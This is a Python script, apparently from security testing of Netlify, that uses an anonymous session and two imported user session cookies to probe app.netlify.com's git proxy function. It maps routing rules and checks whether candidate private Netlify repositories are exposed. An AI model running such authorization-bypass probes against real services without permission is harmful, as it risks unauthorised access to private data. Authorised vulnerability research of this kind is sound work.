# -*- coding: utf-8 -*-
"""git 代理:身份矩阵(anon/A/B)+ 路由规则 + 越权候选探测"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B

ctx = ssl.create_default_context()

def req(path, cookie=None, method='GET', body=None, timeout=20):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = body if isinstance(body, bytes) else body.encode()
    t0 = time.time()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    b = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:180]
    conn.close()
    return st, dt, b

def show(label, path, ck=None):
    st, dt, b = req(path, ck)
    print('%-36s %s %5.1fs | %s' % (label, st, dt, b))

print('== 1. 身份矩阵:公开 repo(应全 200)==')
for ck, nm in [(None, 'anon'), (COOKIE_A, 'COOKIE_A'), (COOKIE_B, 'COOKIE_B')]:
    show('repos/1643584176/scan %s' % nm, '/.netlify/functions/git/repos/1643584176/scan', ck)

print()
print('== 2. /user 系列 421 原因:路由段数规则 ==')
show('A user(1段)', '/.netlify/functions/git/user', COOKIE_A)
show('A users/x(2段)', '/.netlify/functions/git/users/1643584176', COOKIE_A)
show('A repos/x/y/commits(4段)', '/.netlify/functions/git/repos/1643584176/scan/commits', COOKIE_A)
show('A repos/x/y/contents/', '/.netlify/functions/git/repos/1643584176/scan/contents/', COOKIE_A)
show('A rate_limit', '/.netlify/functions/git/rate_limit', COOKIE_A)
show('A octocat', '/.netlify/functions/git/octocat', COOKIE_A)
show('A orgs/nonexist/repos', '/.netlify/functions/git/orgs/no-such-org-zzz/repos', COOKIE_A)

print()
print('== 3. 候选私有 repo 探测:octocat/Hello-World 是 public,测试常见 netlify 内部名 ==')
cands = ['netlify/open-api', 'netlify/next-runtime', 'netlify/cli', 'netlify/netlify-cms',
         'netlify/js-client', 'netlify/build-image', '1643584176/scan']
for c in cands:
    show('repos/%s' % c, '/.netlify/functions/git/repos/' + c, COOKIE_A)

print()
print('== 4. 代理转发头/身份细节:响应差异 ==')
show('anon /repos/x/y(私有候选不存在)', '/.netlify/functions/git/repos/no-such-owner-zzz/repo-zzz', None)
show('A /repos/x/y(同上)', '/.netlify/functions/git/repos/no-such-owner-zzz/repo-zzz', COOKIE_A)
print('done')
